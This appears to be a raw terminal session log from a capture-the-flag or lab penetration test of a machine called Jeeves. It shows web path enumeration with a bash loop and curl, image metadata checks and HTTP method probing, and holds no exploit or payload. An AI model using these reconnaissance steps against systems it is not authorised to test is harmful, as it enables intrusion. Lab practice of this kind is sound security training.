+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30    630 Feb  4 16:33 nitko-50000.txt
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 302699 Feb  5 17:21 out.log
+[2026-02-05 17:21:11] [w=1:tmux] [p=%1] [OUT] cd ../logscd cd ....     
+[2026-02-05 17:21:11] [pane=%1] [CMD_START] cd ..
+[2026-02-05 17:21:12] [pane=%1] [CMD_START] ll
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] total 32
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  175 Feb  4 19:10  attack-chain.md
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  4 19:10  bloodhound
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  4 19:10  evidence
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  4 16:28  ffuf
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  251 Feb  4 19:10 'Jeeves writeup.md'
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  5 16:57  logs
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  4 19:10  loot
+[2026-02-05 17:21:12] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Feb  4 19:34  nmap
+[2026-02-05 17:21:21] [pane=%1] [CMD_START] cd logs
+[2026-02-05 17:21:45] [pane=%1] [CMD_START] vim caseSensitive50000.sh
+[2026-02-05 17:21:54] [w=1:tmux] [p=%1] [OUT] "caseSensitive50000.sh" [New]▽  zz0%m           >c~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            ~                                                                                            0,0-1Alli -- INSERT --0,1All  for path in "askjeeves" "AskJeeves" "Jeeves" "jeeves" "ask"; do
+[2026-02-05 17:22:00] [w=1:tmux] [p=%1] [OUT] 3~@k3x2
+[2026-02-05 17:22:01] [w=1:tmux] [p=%1] [OUT] 2~@k4x2
+[2026-02-05 17:22:02] [w=1:tmux] [p=%1] [OUT] 1~@k4x2~@k   for path in "askjeeves" AskJeeves" Jeeves" jeeves" ask"; do
+[2026-02-05 17:22:06] [w=1:tmux] [p=%1] [OUT] done 1,1All^[  ^[  ::wq
+[2026-02-05 17:22:06] [w=1:tmux] [p=%1] [OUT] "caseSensitive50000.sh" [New] 4L, 279B written
+[2026-02-05 17:22:25] [pane=%1] [CMD_START] chmod +x caseSensitive50000.sh
+[2026-02-05 17:22:28] [pane=%1] [CMD_START] ll
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] total 340
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    504 Feb  4 16:49 36318.txt
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    739 Feb  4 16:49 50438.txt
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rwxrwxr-x 1 b7h30 b7h30    279 Feb  5 17:22 caseSensitive50000.sh
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   7193 Feb  5 17:22 cmd.log
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rwxrwxr-x 1 b7h30 b7h30    369 Feb  4 17:14 commonContextPaths.sh
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   1080 Feb  5 16:57 enum4linux.txt
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30    630 Feb  4 16:33 nitko-50000.txt
+[2026-02-05 17:22:28] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 308504 Feb  5 17:22 out.log
+[2026-02-05 17:22:32] [pane=%1] [CMD_START] ./caseSensitive50000.sh
+[2026-02-05 17:22:32] [w=1:tmux] [p=%1] [OUT] Testing: /askjeeves
+[2026-02-05 17:22:33] [w=1:tmux] [p=%1] [OUT] Status: 302
+[2026-02-05 17:22:33] [w=1:tmux] [p=%1] [OUT] Testing: /AskJeeves
+[2026-02-05 17:22:33] [w=1:tmux] [p=%1] [OUT] Status: 404
+[2026-02-05 17:22:33] [w=1:tmux] [p=%1] [OUT] Testing: /Jeeves
+[2026-02-05 17:22:33] [w=1:tmux] [p=%1] [OUT] Testing: /jeeves
+[2026-02-05 17:22:34] [w=1:tmux] [p=%1] [OUT] Testing: /ask
+[2026-02-05 17:22:56] [w=1:tmux] [p=%1] [OUT] "http://10.129.228.112:50000/jenkins/"curl -sL -o /dev/null -w "Status: %{http_code}, Redirect: %{redirect_url}\n""http://10.129.228.112:50000/jenkins/"  "http://10.129.228.112:50000/jenkins/"
+[2026-02-05 17:23:01] [w=1:tmux] [p=%1] [OUT] "http://10.129.228.112:50000/jenkins/"
+[2026-02-05 17:23:01] [pane=%1] [CMD_START] curl -sL -o /dev/null -w "Status: %{http_code}, Redirect: %{redirect_url}\n" "http://10.129.228.112:50000/jenkins/"
+[2026-02-05 17:23:01] [w=1:tmux] [p=%1] [OUT] Status: 404, Redirect:
+[2026-02-05 17:23:16] [pane=%1] [CMD_START] curl -sL -o /dev/null -w "Status: %{http_code}, Redirect: %{redirect_url}\n" "http://10.129.228.112:50000/askjeeves/"
+[2026-02-05 17:23:30] [w=1:tmux] [p=%1] [OUT] Status: 200, Redirect:
+[2026-02-05 17:27:55] [w=1:tmux] [p=%1] [OUT] http://10.129.228.112/jeeves.PNG -o evidence/jeeves.PNG && exiftool evidence/jeeves.PNGexiftool2>/dev/null || curl -shttp://10.129.228.112/jeeves.PNG -o&& exiftoolexiftool2>/dev/null || curl -shttp://10.129.228.112-o && exiftool evidence/jeeves.PNGexiftool2>/dev/null || curl -shttp://10.129.228.112/jeeves.PNG -o&& exiftoolexiftool2>/dev/null || curl -shttp://10.129.228.112-o && exiftool evidence/jeeves.PNGexiftool2>/dev/null || curl -shttp://10.129.228.112/jeeves.PNG -o&& exiftool  http://10.129.228.112/jeeves.PNG -o evidence/jeeves.PNG && exif                                                                http://10.129.228.112-o evidence/jeeves.PNG && exiffto 
+[2026-02-05 17:27:55] [pane=%1] [CMD_START] exiftool http://10.129.228.112/jeeves.PNG 2>/dev/null || curl -s http://10.129.228.112/jeeves.PNG -o evidence/jeeves.PNG && exiftool evidence/jeeves.PNG
+[2026-02-05 17:28:04] [pane=%1] [CMD_START] ll
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] total 344
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    504 Feb  4 16:49 36318.txt
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    739 Feb  4 16:49 50438.txt
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rwxrwxr-x 1 b7h30 b7h30    279 Feb  5 17:22 caseSensitive50000.sh
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   7797 Feb  5 17:28 cmd.log
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rwxrwxr-x 1 b7h30 b7h30    369 Feb  4 17:14 commonContextPaths.sh
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   1080 Feb  5 16:57 enum4linux.txt
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30    630 Feb  4 16:33 nitko-50000.txt
+[2026-02-05 17:28:04] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 311690 Feb  5 17:28 out.log
+[2026-02-05 17:35:59] [w=1:tmux] [p=%1] [OUT] exiftool2>/dev/null || curl -s-o&& exiftoolexiftool2>/dev/null || curl -s-o&& exiftool.evidence/jeeves.PNG && exiftool evidence/jeeves.PNG.evidence/jeeves.PNG && exiftool evidence/jeeves.PNG/evidence/jeeves.PNG && exiftool evidence/jeeves.PNG jeeves.PNG && exiftool evidence/jeeves.PNG../evidence/ex ../evidence/
+[2026-02-05 17:35:59] [pane=%1] [CMD_START] exiftool http://10.129.228.112/jeeves.PNG 2>/dev/null || curl -s http://10.129.228.112/jeeves.PNG -o ../evidence/jeeves.PNG && exiftool evidence/jeeves.PNG
+[2026-02-05 17:35:59] [w=1:tmux] [p=%1] [OUT] Error: File not found - evidence/jeeves.PNG
+[2026-02-05 17:36:09] [pane=%1] [CMD_START] exiftool http://10.129.228.112/jeeves.PNG 2>/dev/null || curl -s http://10.129.228.112/jeeves.PNG -o ../evidence/jeeves.PNG && exiftool ../evidence/jeeves.PNG
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] ExifTool Version Number         : 13.44
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Name                       : jeeves.PNG
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Directory                       : ../evidence
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Size                       : 463 kB
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Modification Date/Time     : 2026:02:05 17:36:10-05:00
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Access Date/Time           : 2026:02:05 17:36:05-05:00
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Inode Change Date/Time     : 2026:02:05 17:36:10-05:00
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Permissions                : -rw-rw-r--
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Type                       : PNG
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] File Type Extension             : png
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] MIME Type                       : image/png
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Image Width                     : 1212
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Image Height                    : 804
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Bit Depth                       : 8
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Color Type                      : RGB with Alpha
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Compression                     : Deflate/Inflate
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Filter                          : Adaptive
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Interlace                       : Noninterlaced
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] SRGB Rendering                  : Perceptual
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Gamma                           : 2.2
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Pixels Per Unit X               : 3779
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Pixels Per Unit Y               : 3779
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Pixel Units                     : meters
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Image Size                      : 1212x804
+[2026-02-05 17:36:10] [w=1:tmux] [p=%1] [OUT] Megapixels                      : 0.974
+[2026-02-05 17:37:41] [w=1:tmux] [p=%1] [OUT] adhead
+[2026-02-05 17:37:41] [w=1:tmux] [p=%1] [OUT] d
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] d ---550
+[2026-02-05 17:37:44] [pane=%1] [CMD_START] strings ../evidence/jeeves.PNG| head -50
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] IHDR
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] sRGB
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] gAMA
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] pHYs
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] IDATx^
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] AeRF!
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] @]kx
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] s"yw
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] gER?
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] \| "
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] |Z>?'
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] C\0.~
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] w% v
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ;Wap
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] J%
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] &Vkb
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] dep	O
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ]$G"Y
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] `"Nw
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] fd!B
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ?'.5
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ,Oq.
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] Y&x%
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] p5DOf
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ~&r1m
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] Y@dP
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 9=jS
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] w@@@@@@@@@@@@
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] :GNf
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ^+Kl
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] Dyo4J
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] BLcz3#
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] @FH\
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] uE(]
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] y^G_/
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 7AWd&v2
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 4pf&
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 8kvO
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] g@@@@@@@@@@@@
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 7qt
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] M0/HWA
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] lPNDbDC
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] 1<*?w
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] zrsg
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] }jBG[
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] VR#gHf
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] Jn}%i}
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] %[.MC
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] ei|Nu
+[2026-02-05 17:37:44] [w=1:tmux] [p=%1] [OUT] @2Wi
+[2026-02-05 17:40:20] [w=1:tmux] [p=%1] [OUT] OPTIONS -v http://10.129.228.112:50000/ 2>&1 | grep -E "Allow:|X-"X X P
+[2026-02-05 17:40:38] [w=1:tmux] [p=%1] [OUT] OST ---dd d """sseeaarrcchh--=- h h==tteesstt"" " https ://10.12
+[2026-02-05 17:40:38] [w=1:tmux] [p=%1] [OUT] 9
+[2026-02-05 17:40:46] [w=1:tmux] [p=%1] [OUT] 9.228.112/
+[2026-02-05 17:40:46] [pane=%1] [CMD_START] curl -X POST -d "search=test" http://10.129.228.112/
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <html xmlns="http://www.w3.org/1999/xhtml">
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <head>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <title>405 - HTTP verb used to access this page is not allowed.</title>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <style type="text/css">
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <!--
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] fieldset{padding:0 15px 10px 15px;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] h1{font-size:2.4em;margin:0;color:#FFF;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] h2{font-size:1.7em;margin:0;color:#CC0000;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] #header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] background-color:#555555;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] #content{margin:0 0 0 2%;position:relative;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] .content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] -->
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </style>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </head>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <body>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <div id="header"><h1>Server Error</h1></div>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <div id="content">
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <div class="content-container"><fieldset>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <h2>405 - HTTP verb used to access this page is not allowed.</h2>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </fieldset></div>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </div>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </body>
+[2026-02-05 17:40:48] [w=1:tmux] [p=%1] [OUT] </html>
+[2026-02-05 17:41:29] [pane=%1] [CMD_START] curl -s http://10.129.228.112/style.css
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] body {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #fff url(Ask-Jeeves-whatever-happened-to-32225327-270-301.jpg) no-repeat calc(50% - 240px);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font: 13px 'Lucida sans', Arial, Helvetica;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color: #eee;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-align: center;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] a {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color: #ccc;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] /*-------------------------------------*/
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .cf:before, .cf:after{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] content:"";
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] display:table;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .cf:after{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] clear:both;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .cf{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] zoom:1;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] width: 450px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] padding: 15px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] margin: 150px auto 50px auto;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #F0F6FB;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: linear (#fff, #F0F6FB);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -moz-border-radius: 10px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -webkit-border-radius: 10px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border: 1px solid #EEF8FE;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-radius: 10px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] box-shadow: 0 1px 1px #FFF inset, 0 1px 0 #e7edf3;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] width: 330px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] height: 20px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] padding: 10px 5px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] float: left;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font: bold 15px 'lucida sans', 'trebuchet MS', 'Tahoma';
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border: 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #fff;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -moz-border-radius: 3px 0 0 3px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -webkit-border-radius: 3px 0 0 3px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-radius: 3px 0 0 3px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input:focus {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] outline: 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] /*background: #fff;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -moz-box-shadow: 0 0 2px rgba(0,0,0,.8) inset;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -webkit-box-shadow: 0 0 2px rgba(0,0,0,.8) inset;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] box-shadow: 0 0 2px rgba(0,0,0,.8) inset;*/
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input::-webkit-input-placeholder {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color: #999;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font-weight: normal;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font-style: italic;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input:-moz-placeholder {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input:-ms-input-placeholder {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] overflow: visible;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] position: relative;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] float: right;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border: 1px solid #197BD5;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] padding: 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] cursor: pointer;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] height: 40px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] width: 110px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font: bold 15px/40px Verdana, 'Tahoma', 'lucida sans', 'trebuchet MS';
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color: #fff;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-transform: capitalize;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #5BA3E3;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: linear-gradient(#66A8E3, #66A8E3,#197BD5);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -moz-border-radius: 0 3px 3px 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] -webkit-border-radius: 0 3px 3px 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-radius: 0 5px 5px 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-shadow: 0 -1px 0 rgba(0, 0 ,0, .3);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button:hover{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #197BD5;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: linear-gradient(#197BD5,#66A8E3);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button:active,
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button:focus{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] background: #c42f2f;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button:before {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] content: '';
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] position: absolute;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-width: 8px 8px 8px 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-style: solid solid solid none;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-color: transparent #fff transparent;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] top: 12px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] left: -349px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input:hover:before{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-right-color: #e54040;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper input:focus:before{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border-right-color: #c42f2f;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .form-wrapper button::-moz-focus-inner {
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] border: 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] padding: 0;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .byline {
